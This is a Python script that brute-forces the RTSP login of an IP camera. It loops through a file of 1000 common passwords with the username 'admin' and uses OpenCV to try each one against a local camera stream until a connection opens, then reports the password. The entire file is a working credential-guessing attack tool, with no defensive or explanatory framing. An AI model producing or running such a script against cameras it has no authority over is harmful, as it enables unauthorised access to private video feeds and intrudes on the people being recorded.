import cv2
import time
from urllib.parse import quote # Makes sure special character don't interfere with the URL

password_path = '1000-most-common-passwords.txt'

# Read in passwords
with open(password_path, 'r') as f:
    passwords = f.read().strip().split('\n')

# Set up constants and flags
username = 'admin'
found = False
start =  time.time()

# Attempt every password
for password in passwords:
    print(f'Trying: {password}')

    # Try to connect to the URL
    cap = cv2.VideoCapture(f"rtsp://{username}:{quote(password)}@192.168.0.129:554/ch01/0")

    # Exit the loop if the connection was succesful
    if cap.isOpened():
        cap.release()
        found = True
        break
    
    # Release the capture and go to the next password
    cap.release()

# Print that you found it, with some stats
if found:
    print(f'Password found: `{password}`.', end= ' ')
else:
    print(f'Password not found.', end=' ')
print(f'Time elapsed: {round(time.time()-start, 2)} seconds.')